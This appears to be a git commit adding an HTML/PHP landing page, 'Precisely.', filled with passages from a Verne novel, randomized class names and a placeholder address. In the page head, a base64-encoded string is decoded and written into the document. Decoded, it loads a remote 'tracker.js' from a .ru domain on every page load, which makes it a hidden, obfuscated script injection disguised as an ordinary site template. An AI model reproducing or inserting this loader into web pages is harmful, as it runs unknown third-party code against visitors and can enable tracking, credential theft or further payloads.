2cc456a088afff16d4d490cd8ee6313d01b2c5b1
ydbutpwf <77174232+ydbutpwf@users.noreply.github.com>
2021-01-08 23:17:39 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Precisely.</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9jbG90eGFsNmZ1ZGtqdDJjcjgiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header class="cnbdf4z4w3rmxl33kpdoet2j">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="#">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="47wmlau3gy83ehjffhb">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>Precisely.</h1>
+	</section>
+
+
+	<section class="our-work" class="j8vip4ecps6i0geanamupzt2">
+		<h3 class="title">This reception was not encouraging; but I was deter</h3>
+		<p>Calm yourself, I said to the impetuous Ned, anger will do no good. If master were to tell our story, said Conseil, perhaps these gentlemen may understand some words. I can still see Captain Nemo's position. Holding himself well together, he waited for the shark with admirable coolness; and, when it rushed at him, threw himself on one side with wonderful quickness, avoiding the shock, and burying his dagger deep into its side. But it was not all over. A terrible combat ensued. Another application of electricity. This dial hanging in front of us indicates the speed of the Nautilus. An electric thread puts it in communication with the screw, and the needle indicates the real speed. Look! now we are spinning along with a uniform speed of fifteen miles an hour.</p>
+		<hr>
+
+		<ul class="grid" class="0zgrzsl8a5ijs33f35zrcow">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="cnbdf4z4w3rmxl33kpdoet2j">
+		<h3 class="title">We are going to start, said he.</h3>
+		<p>Could there be fire on board? I asked myself. After some minutes, the part of the fruits that was exposed to the fire was completely roasted. The interior looked like a white pastry, a sort of soft crumb, the flavor of which was like that of an artichoke. Then I did the same for Conseil, and we continued to swim near to each other. On the 23d of July the Great Eastern was not more than 500 miles from Newfoundland, when they telegraphed from Ireland news of the armistice concluded between Prussia and Austria after Sadowa. On the 27th, in the midst of heavy fogs, they reached the port of Heart's Content. The enterprise was successfully terminated; and for its first dispatch young America addressed old Europe in these words of wisdom so rarely understood: Glory to God in the highest, and on earth peace, good-will toward men.</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="47wmlau3gy83ehjffhb" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="0zgrzsl8a5ijs33f35zrcow" class="title">Good, sir! but do you forget that the Nautilus is armed with a </h3>	
+		<p>He had not finished the words when we heard a crashing noise, the bolts gave way, and the boat, torn from its groove, was hurled like a stone from a sling into the midst of the whirlpool. Precisely. In looking at Conseil, I could see he was undergoing a little of the general influence. At least I thought so. Perhaps for the first time his nerves vibrated to a sentiment of curiosity. With the Ruhmkorff lamp hanging from my belt, and the gun in my hand, I was ready to set out. But to speak the truth, imprisoned in these heavy garments, and glued to the deck by my leaden soles, it was impossible for me to take a step.</p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="cnbdf4z4w3rmxl33kpdoet2j">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="47wmlau3gy83ehjffhb"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="j8vip4ecps6i0geanamupzt2"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="0zgrzsl8a5ijs33f35zrcow"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>8690 Fritsch Cape, Apt. 354, 29767-7419, Port Bernhard, Nevada, United States</p>
+	</footer>
+
+</body>
+
+</html>
